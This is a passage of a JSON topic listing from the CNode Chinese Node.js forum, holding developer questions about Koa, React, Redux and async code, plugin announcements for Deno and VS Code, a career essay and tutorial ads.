href=\"https://github.com/BengBu-YueZhang/very-simple-react\">简易的React的实现</a></p>\n</div>","title":"VueRouter源码分析","last_reply_at":"2019-04-17T11:47:41.389Z","good":false,"top":false,"reply_count":0,"visit_count":393,"create_at":"2019-04-17T11:47:41.389Z","author":{"loginname":"BengBu-YueZhang","avatar_url":"https://avatars3.githubusercontent.com/u/24958677?v=4&s=120"}},{"id":"5cb6e230a86ae80ce64b03e6","author_id":"5905f959782dbc4b183ecf41","tab":"ask","content":"<div class=\"markdown-text\"><p>今天发现，不同用户之间或多个请求之间阻塞了，这样就不能并发了。如下面的代码，延迟5秒模拟数据库</p>\n<pre class=\"prettyprint\"><code>const Koa = require(&#x27;koa&#x27;);\nconst app = new Koa();\n\napp.use(async ctx =&gt; {\n  return new Promise(resolve =&gt; {\n    setTimeout(() =&gt; {\n      ctx.body = &#x27;Hello Koa&#x27;;\n      resolve()\n    }, 5000)\n  })\n});\napp.listen(3002);\n</code></pre><p>浏览器同时开启两个标签页，一个用时5.01秒，另一个9.72秒。很明显后面的被前面的阻塞了。所以我想问怎么写才能两个都5秒？\n还有一点，为什么第二个不是大于10秒？\n不是很清楚，希望大家解答</p>\n</div>","title":"node服务器，代码怎么写请求不会互相阻塞？","last_reply_at":"2019-04-17T09:29:27.625Z","good":false,"top":false,"reply_count":7,"visit_count":566,"create_at":"2019-04-17T08:22:08.566Z","author":{"loginname":"ooooevan","avatar_url":"https://avatars2.githubusercontent.com/u/25603236?v=4&s=120"}},{"id":"5c73d9c2ab86b86ddf6b2b4a","author_id":"51f0f267f4963ade0e08f503","tab":"share","content":"<div class=\"markdown-text\"><p>更灵活的机动、更快的效率、更高的产能\nServerless - 解放的不仅仅是生产力，更是一种全新的思维方式。</p>\n<p>百姓网 Hax、上线了郭达峰、ThoughtWorks 陈欢、阿里云杜万、淘宝冰森等优秀分享者，\n期待与你一起进入嗨翻 server 的新场景。</p>\n<p><img src=\"//static.cnodejs.org/FlbUfz7IHVgS4DwmjSrXKiL9fMRl\" alt=\"image.png\">\n<img src=\"//static.cnodejs.org/FlDAitTvYWpWsudI8VGjfjGGXYRr\" alt=\"image.png\"></p>\n<p>时间：03 月 16 日周六\n地点：上海证大五道口广场</p>\n<p>报名链接：<a href=\"https://survey.alibaba.com/apps/zhiliao/tZc2WjLe2\">https://survey.alibaba.com/apps/zhiliao/tZc2WjLe2</a>\n活动主页：<a href=\"https://taobaofed.github.io/nodejs-club/\">https://taobaofed.github.io/nodejs-club/</a></p>\n</div>","title":"Node 地下铁第八期「上海站」线下沙龙邀约 - Let's Go Serverless!","last_reply_at":"2019-04-17T09:15:15.569Z","good":false,"top":false,"reply_count":45,"visit_count":8796,"create_at":"2019-02-25T12:04:18.826Z","author":{"loginname":"lellansin","avatar_url":"https://avatars2.githubusercontent.com/u/2081487?v=4&s=120"}},{"id":"5c81c18f5b8cb21491ca70b4","author_id":"53e1802fbd3cc3e50ba9e311","tab":"share","content":"<div class=\"markdown-text\"><p>这几天为 Deno 开发了一个 VS Code 插件：<a href=\"https://marketplace.visualstudio.com/items?itemName=justjavac.vscode-deno\">Deno support for VSCode</a>，GitHub 地址：<a href=\"https://github.com/justjavac/vscode-deno\">https://github.com/justjavac/vscode-deno</a>。</p>\n<p>自 Deno 发布以来就备受关注，也有很多媒体和开发者称 Deno 为“下一代 Node.js”。然而 Deno 的目标则是不兼容 Node.js，没有 npm，没有 package.json。</p>\n<p>Deno 的目标旨在提供一个兼容浏览器的平台，因此 Deno 可以像浏览器的 ES Modules 那样，通过 URL 加载模块:</p>\n<pre class=\"prettyprint language-js\"><code>import * as log from &quot;https:&#x2F;&#x2F;deno.land&#x2F;x&#x2F;std&#x2F;log&#x2F;mod.ts&quot;;\n</code></pre><p>而且在加载模块时<strong>不能省略扩展名</strong>。</p>\n<p>但是，目前的所有开发工具都是为 Node.js 而构建的。在 TypeScript 中，我们不需要添加 <code>.ts</code> 扩展名。如果我们添加了，VS Code 会给我们一个错误提示：</p>\n<blockquote>\n<p>ts(2691): An import path cannot end with a ‘.ts’ extension. Consider importing ‘./hello’ instead.</p>\n</blockquote>\n<p><img src=\"//static.cnodejs.org/FmViYchU4wYG_7g9TSyHllRUtDzQ\" alt=\"ts-error-2691\"></p>\n<p>而另一个问题则是，Deno 可以加载远程模块，但是 TypeScript 却不行。比如上面的代码，也是会报错的：</p>\n<blockquote>\n<p>ts(2307): Cannot find module ‘<a href=\"https://deno.land/x/std/log/mod\">https://deno.land/x/std/log/mod</a>’.</p>\n</blockquote>\n<p><img src=\"//static.cnodejs.org/FsbcG1h3loRuD1WHlZuudPuiG4-I\" alt=\"ts-error-2307\"></p>\n<p>而这个插件正是为了解决这 2 个问题。</p>\n<p>但是这两个错误不是 VS Code 提供了，而是 TypeScript 的编译器 tsc 提供的，因此需要修改 tsc 的功能。好消息是，TypeScript 从 2.3 开始便支持了 <a href=\"https://github.com/Microsoft/TypeScript/wiki/Writing-a-Language-Service-Plugin\">Language Service Plugin</a>，这个功能仅能增强编辑体验，无法改变 TypeScript 核心行为（比如改变类型检查行为）或增加新特性（比如提供一种新语法或者）。通过查看 Language Service Plugin 的说明文件，这个功能正是我需要的。</p>\n<p>所以在写这个 VS Code 插件之前，我又为 TypeScript 写了一个插件：<a href=\"https://github.com/justjavac/typescript-deno-plugin\">typescript-deno-plugin</a>。这个插件不仅可以用在 VS Code，还可以用在任何支持 TypeScript 的编辑器，比如 Atom、Visual Studio、WebStorm 等。</p>\n<p>VS Code 插件提供了开箱即用的 Deno 支持，开发者不需要任何配置，但是有一个前提是：开发者需要使用 VS Code 内置的 TypeScript。如果你在项目中自行安装了 TypeScript，并且修改了 VS Code 的配置，使用了自己安装的版本，则需要自行安装配置 <a href=\"https://github.com/justjavac/typescript-deno-plugin\">typescript-deno-plugin</a> 插件。通过修改 <code>tsconfig.json</code> 的 <code>plugins</code>：</p>\n<pre class=\"prettyprint language-json\"><code>{\n  &quot;compilerOptions&quot;: {\n    &quot;plugins&quot;: [\n      {\n        &quot;name&quot;: &quot;typescript-deno-plugin&quot;\n      }\n    ]\n  }\n}\n</code></pre><p>如果你正在打算学习 Deno 的开发，可以通过这个链接 <a href=\"https://marketplace.visualstudio.com/items?itemName=justjavac.vscode-deno\">Deno support for VSCode</a> 安装插件。</p>\n<p>祝，开发愉快。</p>\n</div>","title":"我为 Deno 开发了一个 VS Code 插件","last_reply_at":"2019-04-17T06:43:57.402Z","good":true,"top":false,"reply_count":7,"visit_count":2216,"create_at":"2019-03-08T01:12:47.402Z","author":{"loginname":"justjavac","avatar_url":"https://avatars1.githubusercontent.com/u/359395?v=4&s=120"}},{"id":"5c769cd4ab86b86ddf6b387a","author_id":"5a0dbddde2f4b8ea224964b6","tab":"share","content":"<div class=\"markdown-text\"><p>最近平时有空了也学习学习Node.js，在codejs平台也有一些不错的教程，同时也发现平台有提供开放的 <a href=\"https://cnodejs.org/api\">API</a> 给开发者们。平时工作主要做小程序，于是乎就想运用cnode平台提供的API来做一个下程序客户端。</p>\n<p>之前也有尝试过写过，不过感觉体验很不好，这次重新弄了一个新的，界面干净了很多，资讯嘛还是以内容为主。希望能够帮助到大家，共同学习共同进步。写的比较仓促，样式参考、数据请求处理，差不多用了1天的时间。目前只用到了<strong>get /topics 主题首页</strong> 和 <strong>get /topic/:id 主题详情</strong>。也就是列表和详情页，后续也会陆续更新，不断完善。</p>\n<p><strong>Node随心阅</strong>微信小程序码：</p>\n<p><img src=\"//static.cnodejs.org/Fjd6d5yI8pZ4SPqliGmhUzjRIuW2\" alt=\"gh_26ff2b7c5db7_258.jpg\"></p>\n<p>该微信小程序的开发没有使用第三方框架，直接使用的是微信小程序原生的方式来开发的。参考文档为微信小程序官方开发文档，第一版(v1.0.01)主要的功能点：</p>\n<ul>\n<li>\n<p>首页</p>\n<ol>\n<li>列表展示</li>\n<li>类别切换（点击分类可选择全部分类、精华、问答、招聘）</li>\n<li>点击右上角将当前类别列表分享给好友</li>\n<li>下拉刷新、上拉加载</li>\n</ol>\n</li>\n<li>\n<p>详情页</p>\n<ol>\n<li>内容展示</li>\n<li>用户回复列表</li>\n<li>分享好友。 详情页的分享路径用户打开有个重定向的过程，这样可以保证被分享者打开后可以返回到首页列表。</li>\n</ol>\n</li>\n</ul>\n<p>后续也会慢慢优化和改善相关的体验，同时也慢慢添加一些新的功能点，不多学习和完善。</p>\n<p>免责申明： 此小程序为业余以学习为目的开发，不属于官方小程序客户端。如有相关问题请告知开发者，联系方式：</p>\n<p>微信:  <a href=\"#\">aoxiaoqiang001</a></p>\n<p>Email:  <a href=\"mailto:aoxiaoqiang@163.com\">aoxiaoqiang@163.com</a></p>\n<hr>\n<p>PS： 最近也基于此小程序开发、维护了一个“足球教练社区”的小程序，欢迎大家体验。发现Bug可及时在下方留言反馈，感谢。</p>\n<p><strong>足球教练社区</strong>微信小程序码：\n<img src=\"//static.cnodejs.org/FjspD4pvMKjNz3z-xfLuSDan7X9l\" alt=\"image.png\"></p>\n</div>","title":"CNode 社区微信小程序客户端","last_reply_at":"2019-04-17T06:14:10.763Z","good":false,"top":false,"reply_count":13,"visit_count":1868,"create_at":"2019-02-27T14:21:08.196Z","author":{"loginname":"aoxiaoqiang","avatar_url":"https://avatars1.githubusercontent.com/u/17998436?v=4&s=120"}},{"id":"5b5e78f5673571454c633cea","author_id":"5b56866ae740336c7bedb345","tab":"share","content":"<div class=\"markdown-text\"><p><strong>koa2实战项目介绍（真全栈）：</strong></p>\n<p><strong>Nodejs+koa2实战视频教程</strong>从零开始一步一步让你学会Koa基础以及用用<strong>Koa开发项目</strong>，本教程涉及 用户权限判断 、<strong>验证码</strong> 、分页、多级分类、<strong>ueditor可视化富文本编辑器</strong>、图片上传、<strong>底层DB库封装</strong>、<strong>扩展art-template的核心方法、<strong>ajax改变状态、ajax排序、以及赠送的</strong>Socket.io机器人</strong> 、Socket.io多人聊天室、<strong>Socket.io群聊</strong>、前后端分离 <strong>RESTful API Api</strong>接口、购买域名 服务器、域名备案、<strong>nginx负载均衡</strong>、<strong>域名解析部署nodejs程序</strong>、Nodejs进程管理器pm2模块、Koa操作<strong>mysql数据库</strong></p>\n<p><strong>地址：</strong> <a href=\"https://www.itying.com/goods-800.html\">Koa2实战视频教程下载地址点我</a></p>\n<p><strong>2018 Nodejs+Koa2入门实战视频教程百度网盘下载地址（41讲免费基础下载地址）：</strong></p>\n<p><a href=\"https://pan.baidu.com/s/1KNaA97kGwNhavch5rP_G7w\">https://pan.baidu.com/s/1KNaA97kGwNhavch5rP_G7w</a></p>\n</div>","title":"Nodejs+koa2实战视频教程【87讲】--Koa2+Nodejs+MongoDb打造企业级CMS前后端全栈项目实战视频教程","last_reply_at":"2019-04-17T01:48:48.609Z","good":false,"top":false,"reply_count":80,"visit_count":16574,"create_at":"2018-07-30T02:33:25.113Z","author":{"loginname":"songsunli","avatar_url":"https://avatars1.githubusercontent.com/u/41601667?v=4&s=120"}},{"id":"5c91da248a587f26b426cd1b","author_id":"55a8ba4c0b9ddb895675df3a","tab":"ask","content":"<div class=\"markdown-text\"><p>把所有东西都放在ctx上面，这样真的合理吗？</p>\n</div>","title":"Egg这样的设计真的合理吗，把所有东西都放在ctx上面","last_reply_at":"2019-04-17T01:45:11.065Z","good":false,"top":false,"reply_count":20,"visit_count":1812,"create_at":"2019-03-20T06:13:56.281Z","author":{"loginname":"luluzero","avatar_url":"https://avatars1.githubusercontent.com/u/10164939?v=4&s=120"}},{"id":"5bc000d015e4fd1923f48e3f","author_id":"5b2a0c5029e6e510415b2c0f","tab":"share","content":"<div class=\"markdown-text\"><p>Node.js初中高级全栈高清视频教程、全栈工程师项目实战开发基础视频教程，带你从入门到精通！</p>\n<p>01【基础】Node：nodejs快速进阶（版本4.1.0）\n<img src=\"//static.cnodejs.org/FmZ2l1AiKERlqpJJxo_GnjRtmpvK\" alt=\"2.jpg\"></p>\n<p>02【实战】node.js从入门到实战教育项目(版本v6.9.1)\n<img src=\"//static.cnodejs.org/FhH4Dh-K7d4a31xfLSm_jWS1iD4r\" alt=\"3.jpg\"></p>\n<p>03【实战】Nodejs+ES6+Webpack+Vuejs构建大型商城（版本6.10.3）\n<img src=\"//static.cnodejs.org/FvoBxx8AMU3KobeIgENDY2vi9OPj\" alt=\"4.jpg\">\n下载地址：<a href=\"http://www.sucaihuo.com/video/387.html\">http://www.sucaihuo.com/video/387.html</a></p>\n</div>","title":"Node.js初中高级全栈高清视频教程","last_reply_at":"2019-04-17T01:18:15.845Z","good":false,"top":false,"reply_count":15,"visit_count":4590,"create_at":"2018-10-12T02:02:56.504Z","author":{"loginname":"whoknowme","avatar_url":"https://avatars0.githubusercontent.com/u/40422811?v=4&s=120"}},{"id":"5bce82227a248c7f50334c6c","author_id":"5338d96c88ed3fc55b0088cc","tab":"share","content":"<div class=\"markdown-text\"><h1>VSCode 注释翻译</h1>\n<h2>简介</h2>\n<p><a href=\"https://github.com/intellism/vscode-comment-translate\">【源码】</a> <a href=\"https://marketplace.visualstudio.com/items?itemName=intellsmi.comment-translate\">【安装】</a></p>\n<p>许多优秀的项目，都有丰富的注释，使用者可以快速理解代码意图。但是如果使用者并不熟习注释的语言，会带来理解困难。本插件使用 Google Translate API 翻译 VSCode 的编程语言的注释。</p>\n<h2>功能</h2>\n<ol>\n<li>\n<p>识别代码中注释部分，不干扰阅读。支持不同语言，单行、多行注释\n<img src=\"https://github.com/intellism/vscode-comment-translate/blob/master/doc/image/cn/Introduction.gif?raw=true\" alt=\"Introduction\"></p>\n</li>\n<li>\n<p>支持用户字符串与变量翻译,支持驼峰拆分\n<img src=\"https://github.com/intellism/vscode-comment-translate/blob/master/doc/image/cn/variable.gif?raw=true\" alt=\"Introduction\"></p>\n</li>\n<li>\n<p>选中最后一次翻译区域命令\n<img src=\"https://github.com/intellism/vscode-comment-translate/blob/master/doc/image/cn/select.gif?raw=true\" alt=\"Introduction\"></p>\n</li>\n<li>\n<p>选择区域翻译\n<img src=\"https://github.com/intellism/vscode-comment-translate/blob/master/doc/image/cn/selection.gif?raw=true\" alt=\"Introduction\"></p>\n</li>\n</ol>\n<h2>配置项</h2>\n<h4>多国语言支持</h4>\n<p>状态栏快速配置目标语言\n<img src=\"https://github.com/intellism/vscode-comment-translate/blob/master/doc/image/cn/status-bar.gif?raw=true\" alt=\"Multi-language\"></p>\n<table>\n<thead>\n<tr>\n<th>Display Language</th>\n<th>Locale</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>English (US)</td>\n<td><code>en</code></td>\n</tr>\n<tr>\n<td>Simplified Chinese</td>\n<td><code>zh-CN</code></td>\n</tr>\n<tr>\n<td>Traditional Chinese</td>\n<td><code>zh-TW</code></td>\n</tr>\n<tr>\n<td>French</td>\n<td><code>fr</code></td>\n</tr>\n<tr>\n<td>German</td>\n<td><code>de</code></td>\n</tr>\n<tr>\n<td>Italian</td>\n<td><code>it</code></td>\n</tr>\n<tr>\n<td>Spanish</td>\n<td><code>es</code></td>\n</tr>\n<tr>\n<td>Japanese</td>\n<td><code>ja</code></td>\n</tr>\n<tr>\n<td>Korean</td>\n<td><code>ko</code></td>\n</tr>\n<tr>\n<td>Russian</td>\n<td><code>ru</code></td>\n</tr>\n<tr>\n<td>Bulgarian</td>\n<td><code>bg</code></td>\n</tr>\n<tr>\n<td>Hungarian</td>\n<td><code>hu</code></td>\n</tr>\n<tr>\n<td>Portuguese (Brazil)</td>\n<td><code>pt-br</code></td>\n</tr>\n<tr>\n<td>Turkish</td>\n<td><code>tr</code></td>\n</tr>\n</tbody>\n</table>\n<h4>合并多行注释 （源语言只支持英语）</h4>\n<p><img src=\"https://github.com/intellism/vscode-comment-translate/blob/master/doc/image/multi-line-merge.gif?raw=true\" alt=\"Multi-line-merge\"></p>\n</div>","title":"推荐VSCode注释翻译插件，方便快速阅读源码","last_reply_at":"2019-04-17T01:09:05.687Z","good":false,"top":false,"reply_count":23,"visit_count":3081,"create_at":"2018-10-23T02:06:26.993Z","author":{"loginname":"intellism","avatar_url":"https://avatars3.githubusercontent.com/u/442894?v=4&s=120"}},{"id":"5cb57119ffa1ea7975a223af","author_id":"5cb56ce1ffa1ea7975a22362","tab":"ask","content":"<div class=\"markdown-text\"><h2>1.在客户端是怎么接收服务器的推送？</h2>\n<p><img src=\"//static.cnodejs.org/FiOXYxZFlf7TvEy1uPvwaG_lexJN\" alt=\"image.png\">\nnode的官方文档有实例，但是这段代码是不能运行在浏览器的，这个客户端指的不是浏览器吗？\nnode文档链接： <a href=\"http://nodejs.cn/api/http2.html\">http://nodejs.cn/api/http2.html</a>\ndart版本的相关实现模块：<a href=\"https://github.com/dart-lang/http2\">https://github.com/dart-lang/http2</a>\nnode的所有http/2的模块：<a href=\"https://github.com/http2/http2-spec/wiki/Implementations\">https://github.com/http2/http2-spec/wiki/Implementations</a>\n<img src=\"//static.cnodejs.org/Fr8zEUXHzskMmMxe12rrigp3ZAJh\" alt=\"image.png\">\n（三个模块都需要依赖与node原生http等依赖）</p>\n<p><strong>2.由这个问题引发的node的所有模块只要引入到浏览器端代码就就报错</strong>\n<img src=\"//static.cnodejs.org/Fj6FbokJtb9Y7aLZ-ABF81-0Zoti\" alt=\"image.png\">\n（图片上用的是typescript项目）\n<img src=\"//static.cnodejs.org/FqIg2AxctbaASNFq5shbkJGUvZGk\" alt=\"image.png\">\n观点：按照我的理解只要是js代码都可以在浏览器上运行（不包括ES6，浏览器不能解析的）\n结论：前端（浏览器是不能运行node的相关模块）\n猜测：node的原生模块不是js（C/C++）</p>\n</div>","title":"http/2服务端推送","last_reply_at":"2019-04-17T01:08:22.895Z","good":false,"top":false,"reply_count":4,"visit_count":820,"create_at":"2019-04-16T06:07:21.467Z","author":{"loginname":"heshuai326","avatar_url":"https://avatars3.githubusercontent.com/u/18663991?v=4&s=120"}},{"id":"5b8e207937b3005a0b0e6b50","author_id":"5b8e1ee0bf116a8c0e4257b4","tab":"ask","content":"<div class=\"markdown-text\"><p>怎么才能真正学好node.js,东西太多了，老忘记怎么办？</p>\n</div>","title":"如何才能学好node.js","last_reply_at":"2019-04-16T14:54:15.605Z","good":false,"top":false,"reply_count":37,"visit_count":6078,"create_at":"2018-09-04T06:04:41.390Z","author":{"loginname":"kouxiang2008","avatar_url":"https://avatars1.githubusercontent.com/u/42954282?v=4&s=120"}},{"id":"5ca4681f6c1de62dce4676dd","author_id":"5c91ace496558e26e1b677bd","tab":"ask","content":"<div class=\"markdown-text\"><p>在nodejs中IO操作是使用线程池进程异步操作的，那么假如我向nodejs请求读取一个大文件，是不是会持续占用线程导致降低服务器处理其他请求的能力。\n在Eggjs中有什么机制来避免大文件访问造成服务器性能下降的办法吗</p>\n</div>","title":"关于Nodejs的IO异步操作以及eggjs处理耗时任务的疑问","last_reply_at":"2019-04-16T14:52:26.379Z","good":false,"top":false,"reply_count":4,"visit_count":950,"create_at":"2019-04-03T08:00:31.009Z","author":{"loginname":"HyperClockUp","avatar_url":"https://avatars2.githubusercontent.com/u/36909196?v=4&s=120"}},{"id":"5cb20aa7dad66d658e408a65","author_id":"50b5bc5d637ffa4155091236","tab":"ask","content":"<div class=\"markdown-text\"><p>与传统cb相比的话</p>\n</div>","title":"promise与aysnc/await是否降低了开发效率？","last_reply_at":"2019-04-16T07:54:57.682Z","good":false,"top":false,"reply_count":13,"visit_count":1247,"create_at":"2019-04-13T16:13:27.109Z","author":{"loginname":"yakczh","avatar_url":"https://avatars3.githubusercontent.com/u/6591466?v=4&s=120"}},{"id":"5b18a28557137f22415c49e9","author_id":"55d120f3b25bd72150842d85","tab":"share","content":"<div class=\"markdown-text\"><h1>前端进阶之困</h1>\n<p>最近看了不少文章和帖子， 如文：</p>\n<ul>\n<li><a href=\"https://juejin.im/post/5b124fdd5188257d6c0465da?utm_source=gold_browser_extension\">前端的焦虑，你想过30岁以后的前端路怎么走吗？</a></li>\n<li><a href=\"https://cnodejs.org/topic/5af047150a36e5312d6ecdf0\">前端怎么一步步走向全栈呢？</a></li>\n<li><a href=\"https://cnodejs.org/topic/5b164efa29e6e510415b2803\">移动端入门Node.js怎么学习?</a></li>\n<li><a href=\"https://cnodejs.org/topic/5a4cc04cebc575dc49b270d5\">前端的未来走向在哪里？</a></li>\n<li><a href=\"https://cnodejs.org/topic/5ab1ebb5e7b166bb7b9eccaa\">工作2年多的前端，现在迷茫了，如何更进一步的提升自己</a></li>\n</ul>\n<p>身边和朋友圈也不少做前端开发的同事朋友问如何发展和提升\n这里我向大家给一些建议</p>\n<h2>扎实基础</h2>\n<p>首先思考下手上的工作是否做得足够好了，近几年前端技术发展迅猛各种框架层出不穷，刚学会jquery还没用熟， angular 、vue 、react 已经满大街了。\ngulp 还没明白怎么回事、webpack 已开始遍地开花了。眼花缭乱的技术不知道从哪里开始好。\n如果你还被这些困扰的话，那请静下来思考一下，技术的发展总是有规律的，学习也是有规律可循的，我的建议是，把共性和必要的技能先稳固下来，既不浪费时间，又能提高效率，如果这块还么稳固好、框架什么少看几种吧，先有一样可用的就好。\n对于加强基础一个可行的方案是，从自己上手的工作开始、除了专注现学现用工作需要的框架技术外加强基础的学习，如：</p>\n<ul>\n<li>基本的逻辑（与、或、非）</li>\n<li>运算操作（加减乘除 Math 下的各种函数）</li>\n<li>字符串处理 （什么大小写、编码、裁剪什么的）</li>\n<li>时间处理 （日期的加减、对比、格式转换等）</li>\n<li>数组、集合对象处理\n可以了解学习一些基础库 如: <a href=\"https://github.com/lodash/lodash\">lodash</a>、<a href=\"https://github.com/moment/moment\">moment</a> 等、若时间有限可以看看示例有个印象回头可以查找，当然最好的方式是实践练习。</li>\n</ul>\n<h2>发展全栈的正确姿势</h2>\n<p>Javascript 生态链对于全栈有一些优势，但全栈不是贴金的标签，如果技能不够硬，必然落得个 <strong>前端不强，后端不行</strong> 的尴尬局面。</p>\n<h3>那对于前端是不是不该发展后端呢？</h3>\n<p>回答当然是否定的，前端<em>有目的、有计划的发展后端技能</em>，对于系统全局观、工作协作能力提升是非常有帮助的，<strong>另外切实让老板愿意为你加工资是非常可能的</strong>。</p>\n<h3>那要如何才能是有目的、有计划的发展后端技能呢？</h3>\n<p>首先认清后端技能出发点和关键点。</p>\n<ul>\n<li>出发点: 是主动权和话语权（可能某个后端老是鄙视你，你要的东西，说这个没办法，那个不应该，造成了你工作很被动，效率不高，出错了可能还先找你）。</li>\n<li>关键点: 前后端接口 （如果你能清晰、标准、明确你要的接口，那么一些都会明朗起来）。\n所以我认为前端切入后端应该从接口开始。</li>\n</ul>\n<h3>从标准接口开始，什么样的接口才是标准的呢？</h3>\n<p><a href=\"https://swagger.io/resources/open-api/\">OpenAPI  Specification</a>\n这里我为大家推荐 Swagger 标准接口 (目前有两个标准 OAS 2.0 和 OAS 3.0)\nSwagger 致力于接口的标准化，并为此提供了一系列的工具，方便大家对进口进行标准化。</p>\n<h3>有什么好处呢</h3>\n<ul>\n<li>简化工作流程 (Streamline Your Workflow)。</li>\n<li>自由构建 (Restraint-Free Build)</li>\n<li>开放/全球化的支持 (Open &amp; Globally Supported)\n我的理解是增强系统的健壮性、降低沟通成本、提高写作效率，另外接口是系统的一种抽象可以更好的从宏观把握系统。</li>\n</ul>\n<h3>标准化的接口要如何实践</h3>\n<p>这里我安利下我的开源项目 <a href=\"https://github.com/vellengs/typerx\">typerx</a>, typerx 是一个轻量注解式的全栈系统、你可以使用他快速的实践接口标准的全栈开发。</p>\n<ul>\n<li>创建接口前、我们仍旧还是要考虑接口模块的、模块化的设计能降低我们一次思考的复杂度。\n在 typerx 中我们分了 core 模块和 cms 模块。</li>\n<li>接口的创建从原型开始考虑、确定接口所需的模型 model, 这个模型我们称之为 DTO(data transform object) 也就是接口的输入输出数据对象。\n<a href=\"https://github.com/vellengs/typerx/blob/master/packages/server/src/modules/core/dto\">dto 的编写示例</a></li>\n<li>有了模型之后我们就可以确定需要哪些接口方法了，编写接口的时候先不着急考虑接口的实现，我们只要先提供模型（可以建立一个按模型提供的数据mock)确保必要的接口规格描述就好，\n<a href=\"https://github.com/vellengs/typerx/blob/master/packages/server/src/modules/core/account.controller.ts\">account 的接口定义</a>\n这里我们通过直接编写代码的方式来实现文档，这样方便我们高效、可维护的接口文档（当然先完成文档再来生成代码也是可以的，不过代码能表述的永远比文档能描述的多，所以应该是有一套能够自动生成api 文档的代码来维护比较合适，过去也曾从文档开始，但文档的错漏不方便验证、而且文档维护数据模型是很累的一个事情无法动态关联重构）。</li>\n<li>按要求完成了接口定义之后，你只要轻松运行</li>\n</ul>\n<pre class=\"prettyprint\"><code>npm run build \n</code></pre><p>你就拥有标准的接口文档描述文件 swagger.json / swagger.yaml 了, 你可以使用 typerx 直接启动服务端预览接口 <a href=\"http://localhost:4700/docs\">localhost:4700</a> 或者放到在线编辑器上预览 <a href=\"http://editor.swagger.io/\">editor.swagger.io</a>;</p>\n<ul>\n<li>好了标准话的接口有了你可以保持这个接和后端的接口一致，这样就可以和后端愉快的协作了，当然如果你喜欢，直接使用 typerx 实现自己真实的后端。</li>\n</ul>\n<p>最后欢迎大家关注 <a href=\"https://github.com/vellengs/typerx\">typerx</a> 一起讨论努力进阶。</p>\n</div>","title":"前端如何进阶全栈开发","last_reply_at":"2019-04-16T06:45:09.281Z","good":false,"top":false,"reply_count":43,"visit_count":9949,"create_at":"2018-06-07T03:12:05.854Z","author":{"loginname":"vellengs","avatar_url":"https://avatars1.githubusercontent.com/u/5743338?v=4&s=120"}},{"id":"5cb521c2207b2365936ed653","author_id":"5cae89e2207b2365936ebb4f","tab":"ask","content":"<div class=\"markdown-text\"><p><strong>描述</strong>：在项目中，需要对接第三方系统（现在项目对接是医院的业务系统，如电子病历系统等）。要基于第三方系统的基础数据来做（授权或者查询病历功能），第三方系统的数据形态很可能不同。我也不确定是啥原因，总是在不断的适配第三方的系统，根据现场的问题在不断修改。</p>\n<p><strong>问题</strong>：需要怎样去采取合理的方式？还是研发怎样去做功能设计？？</p>\n</div>","title":"【请教】：项目中对接第三方系统，怎样的更好方式才能把系统稳定下来","last_reply_at":"2019-04-16T01:02:39.663Z","good":false,"top":false,"reply_count":3,"visit_count":653,"create_at":"2019-04-16T00:28:50.562Z","author":{"loginname":"qiutian00","avatar_url":"https://avatars0.githubusercontent.com/u/24382500?v=4&s=120"}},{"id":"5ca5741631010b2dfbb431d4","author_id":"595dc9f2d1d54a0a0890b4ec","tab":"ask","content":"<div class=\"markdown-text\"><p>react小白，在尝试todolist，遇到一个问题，请大家帮解个惑：\nredux里面reducer修改状态之后，react里面容器的props更新了，但是容器里面的无状态子组件却未更新，这是为什么？\n贴下代码：\n<img src=\"//static.cnodejs.org/FkR3hq8EQJZ3U527bXcuVmegcYMc\" alt=\"react_helloworld_my-hello_src_cont_1.png\">\n<img src=\"//static.cnodejs.org/FuyPLTU0RU8V_ruS__7dHXxCJTaA\" alt=\"react_helloworld_my-hello_src_cont_2.png\">\n调试现场：\n<img src=\"//static.cnodejs.org/FjjRKmDxthgE9Z4nuicXD4IrHO6g\" alt=\"2019-04-04 11_04_13-React App.png\"></p>\n</div>","title":"请教：redux修改状态后，react容器内无状态子组件数据未刷新","last_reply_at":"2019-04-16T00:46:33.363Z","good":false,"top":false,"reply_count":3,"visit_count":838,"create_at":"2019-04-04T03:03:50.168Z","author":{"loginname":"xwwscu","avatar_url":"https://avatars1.githubusercontent.com/u/8022267?v=4&s=120"}},{"id":"5cb4bb41207b2365936ed613","author_id":"5cb4b9b5dad66d658e409645","tab":"ask","content":"<div class=\"markdown-text\"><p>在node中怎么使用mongoose根据前端表单提交的数据进行更新数据库并同步重新渲染到页面中，我之前试过了可以更新数据但是不能同步渲染页面重新登录才可以，有没有大神指导一下啊，挺急的，拜托了</p>\n</div>","title":"更新数据并重新渲染","last_reply_at":"2019-04-15T17:11:29.294Z","good":false,"top":false,"reply_count":0,"visit_count":651,"create_at":"2019-04-15T17:11:29.294Z","author":{"loginname":"forever520cy","avatar_url":"https://avatars1.githubusercontent.com/u/49617584?v=4&s=120"}},{"id":"5ac478e10ab0448f0fe3f86d","author_id":"5ac3a5a437f5d1510f57c88d","tab":"ask","content":"<div class=\"markdown-text\"><p>react.js 入门真心难，太多步骤太多东西要记了</p>\n</div>","title":"React入门真难","last_reply_at":"2019-04-15T15:07:19.380Z","good":false,"top":false,"reply_count":110,"visit_count":15520,"create_at":"2018-04-04T07:04:01.663Z","author":{"loginname":"15766273878","avatar_url":"https://avatars0.githubusercontent.com/u/37205147?v=4&s=120"}},{"id":"5cb20504dad66d658e408a46","author_id":"5b1d495729e6e510415b29b0","tab":"ask","content":"<div class=\"markdown-text\"><p>let func = function(){\n\treuturn new Promise( async (resolve, reject) =&gt; {\n\t\tawait p1();\n\t})\n}\n像这种写法，把async写在这里是否合适？</p>\n</div>","title":"请教关于promise与aysnc/await混用问题","last_reply_at":"2019-04-15T14:25:03.413Z","good":false,"top":false,"reply_count":8,"visit_count":777,"create_at":"2019-04-13T15:49:24.728Z","author":{"loginname":"helloHT","avatar_url":"https://avatars3.githubusercontent.com/u/31006740?v=4&s=120"}},{"id":"5cab070c7edd13064e053550","author_id":"5c862e877ce0df3732426edf","tab":"ask","content":"<div class=\"markdown-text\"><p>给前端一个URL地址(图片，视频，音频地址)，他们就能下载了吧，为什么还要我后端处理？</p>\n</div>","title":"上传下载问题","last_reply_at":"2019-04-15T14:00:51.589Z","good":false,"top":false,"reply_count":8,"visit_count":881,"create_at":"2019-04-08T08:32:12.490Z","author":{"loginname":"cheerApril","avatar_url":"https://avatars0.githubusercontent.com/u/38412944?v=4&s=120"}},{"id":"5cb46814207b2365936ed4c5","author_id":"5c98426500bcfd7eb2be5add","tab":"ask","content":"<div class=\"markdown-text\"><p>比如： id = [1,2,3,…] 